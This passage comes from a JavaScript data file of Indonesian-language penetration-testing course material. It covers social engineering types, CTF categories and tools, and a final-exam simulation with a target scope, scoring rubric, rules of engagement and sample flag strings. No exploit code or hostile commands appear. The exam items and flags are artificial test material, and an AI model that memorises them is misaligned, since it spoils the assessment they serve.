#### 2. Pretexting
Membuat skenario palsu untuk mendapatkan kepercayaan korban.

#### 3. Baiting
Menawarkan sesuatu yang menarik (USB, download) yang berisi malware.

#### 4. Tailgating
Mengikuti orang yang authorized untuk masuk ke area restricted.

#### 5. Vishing
Voice phishing - penipuan melalui telepon.

### Defense Against Social Engineering
- Security awareness training
- Verify identities
- Don't share sensitive info
- Report suspicious activities
- Use multi-factor authentication

---

## 🏁 CTF (Capture The Flag)

### Apa itu CTF?
Kompetisi keamanan siber di mana peserta memecahkan challenges untuk menemukan "flags" tersembunyi.

### Format Flag
\`\`\`
FLAG{this_is_a_sample_flag}
flag{another_format}
CTF{challenge_solved}
\`\`\`

### CTF Categories

#### 1. Web
- SQL Injection
- XSS
- Authentication bypass
- IDOR

#### 2. Cryptography
- Encoding (Base64, Hex)
- Classic ciphers (Caesar, Vigenère)
- Modern crypto (RSA, AES)

#### 3. Forensics
- File analysis
- Memory forensics
- Network captures

#### 4. Reverse Engineering
- Binary analysis
- Decompilation
- Debugging

#### 5. Pwn (Binary Exploitation)
- Buffer overflow
- Format strings
- ROP chains

#### 6. Steganography
- Hidden data in images
- Audio steganography
- File carving

---

## 🧰 CTF Tools

| Category | Tools |
|----------|-------|
| Web | Burp Suite, curl, browser DevTools |
| Crypto | CyberChef, dcode.fr, Python |
| Forensics | Autopsy, Wireshark, strings |
| RevEng | Ghidra, radare2, gdb |
| Stego | steghide, zsteg, binwalk |

---

## 💡 CTF Tips

1. **Read carefully** - Challenge description often contains hints
2. **Start simple** - Try basic techniques first
3. **Take notes** - Document your approach
4. **Google wisely** - Learn from writeups
5. **Collaborate** - Team work makes dream work

---

## 📋 Tugas Praktikum

### Report Writing
1. Buat executive summary dari temuan Session 1-6
2. Format findings dengan proper evidence
3. Buat recommendations yang actionable

### CTF Challenges
1. Selesaikan Web challenges
2. Decode pesan cryptography
3. Temukan hidden flags

**CTF Platform**: Tersedia di menu CTF

> 🎮 **Have fun!** CTF adalah cara terbaik untuk belajar sambil bermain!
`,
    prerequisites: [
      'Menyelesaikan Session 1-6',
      'Kemampuan menulis teknis',
      'Pemahaman tentang keamanan informasi',
      'Problem-solving mindset',
    ],
    resources: [
      { title: 'SANS Report Writing Template', url: 'https://www.sans.org/white-papers/', type: 'template' },
      { title: 'CTFtime', url: 'https://ctftime.org/', type: 'platform' },
      { title: 'PicoCTF', url: 'https://picoctf.org/', type: 'platform' },
      { title: 'CyberChef', url: 'https://gchq.github.io/CyberChef/', type: 'tool' },
    ],
    keyCommands: [
      { command: 'ctf list', description: 'Lihat daftar CTF challenges yang tersedia', example: 'ctf list' },
      { command: 'submit-flag <flag>', description: 'Submit flag untuk CTF challenge', example: "submit-flag FLAG{example_flag}" },
      { command: 'echo <text> | base64 -d', description: 'Decode Base64 encoded text', example: "echo 'SGVsbG8gV29ybGQ=' | base64 -d" },
      { command: 'file <filename>', description: 'Identify file type', example: 'file mysterious_file' },
    ],
  },

  // Session 8: UAS
  session8: {
    theoryContent: `
# 🎓 UAS - Full Penetration Test Simulation

## 🎯 Tujuan Ujian Akhir

Ujian Akhir Semester (UAS) adalah **simulasi penetration test lengkap** yang menguji semua kemampuan yang telah Anda pelajari sepanjang semester.

---

## 📋 Scope Pengujian

### Environment
- **Network**: 10.0.0.0/24
- **Primary Target**: 10.0.0.50 (Windows Server 2019)
- **Secondary Target**: 10.0.0.51 (Linux Web Server)
- **Tertiary Target**: 10.0.0.52 (Database Server)

### Objectives
1. Complete reconnaissance pada semua target
2. Identifikasi dan exploit vulnerabilities
3. Privilege escalation
4. Data exfiltration (flags)
5. Professional penetration testing report

---

## 🔄 Methodology

Ikuti metodologi penetration testing standar:

\`\`\`
┌──────────────┐    ┌─────────────┐    ┌──────────────┐
│    PHASE 1   │───▶│   PHASE 2   │───▶│   PHASE 3    │
│ Reconnaissance│    │  Scanning   │    │ Exploitation │
└──────────────┘    └─────────────┘    └──────────────┘
                                              │
┌──────────────┐    ┌─────────────┐           ▼
│    PHASE 5   │◀───│   PHASE 4   │◀───┌──────────────┐
│  Reporting   │    │Post-Exploit │    │ Priv Escalate│
└──────────────┘    └─────────────┘    └──────────────┘
\`\`\`

---

## 📊 Rubrik Penilaian

| Komponen | Bobot | Kriteria |
|----------|-------|----------|
| Reconnaissance | 15% | Kelengkapan information gathering |
| Scanning | 15% | Thoroughness of enumeration |
| Exploitation | 25% | Successful exploitation |
| Privilege Escalation | 15% | Escalating access |
| Data Collection | 15% | Finding all flags |
| Report Quality | 15% | Professional documentation |

---

## 📝 Deliverables

### 1. Penetration Testing Report
Dokumen komprehensif yang mencakup:
- Executive Summary
- Technical Findings
- Evidence (screenshots, logs)
- Risk Assessment
- Recommendations

### 2. Flags Collected
Submit semua flags yang ditemukan:
\`\`\`
FLAG{reconnaissance_master}
FLAG{port_scanner_pro}
FLAG{sql_injection_expert}
FLAG{privilege_escalated}
FLAG{final_boss_defeated}
\`\`\`

### 3. Reflection
Tuliskan learning experience Anda:
- Challenges yang dihadapi
- Bagaimana Anda mengatasinya
- Skill yang paling berkembang
- Rencana pengembangan selanjutnya

---

## ⏱️ Timeline

| Phase | Duration |
|-------|----------|
| Reconnaissance | 30 menit |
| Scanning & Enumeration | 45 menit |
| Exploitation & PrivEsc | 60 menit |
| Reporting | 45 menit |
| **Total** | **3 jam** |

---

## 🛠️ Allowed Tools

Semua tools yang telah dipelajari:
- OSINT: whois, nslookup, dig, host
- Scanning: nmap, nikto
- Exploitation: sqlmap, msfconsole, searchsploit
- Password: john, hashid
- Web: dirb, curl

---

## ⚠️ Rules of Engagement

### ✅ Allowed
- Scan dan enumerate semua target dalam scope
- Exploit vulnerabilities yang ditemukan
- Privilege escalation
- Collect flags dan evidence
- Document everything

### ❌ Not Allowed
- Attack systems outside scope
- DoS attacks
- Destructive actions (delete/modify data)
- Share findings dengan mahasiswa lain
- Use external help selama ujian

---

## 💡 Final Tips

1. **Manage your time** - Jangan terlalu lama di satu target
2. **Document everything** - Screenshot setiap langkah penting
3. **Think systematically** - Follow the methodology
4. **Don't panic** - Jika stuck, move on dan kembali nanti
5. **Quality over quantity** - Lebih baik complete sedikit target daripada partial banyak

---

## 🏆 Scoring

| Achievement | Points |
|-------------|--------|
| Each flag found | 50 pts |
| Each vulnerability exploited | 30 pts |
| Privilege escalation | 50 pts |
| Complete methodology | 20 pts |
| Professional report | 50 pts |
| **Maximum Total** | **500 pts** |

---

> 🎓 **Good luck on your final exam!**
> 
> Tunjukkan semua yang telah Anda pelajari semester ini.
> Ingat: seorang pentester yang baik bukan hanya tentang skill teknis,
> tapi juga tentang metodologi, dokumentasi, dan komunikasi.
`,
    prerequisites: [
      'Menyelesaikan semua Session 1-7',
      'Pemahaman komprehensif metodologi pentesting',
      'Kemampuan menggunakan semua tools yang dipelajari',
      'Kemampuan menulis laporan profesional',
    ],
    resources: [
      { title: 'Review semua materi Session 1-7', url: '#', type: 'review' },
      { title: 'Checklist Penetration Testing', url: '#', type: 'checklist' },
    ],
    keyCommands: [
      { command: 'Semua commands yang dipelajari', description: 'Gunakan semua pengetahuan dari Session 1-7', example: 'whois, nmap, sqlmap, msfconsole, dll' },
    ],
  },
};

export default labMaterials;
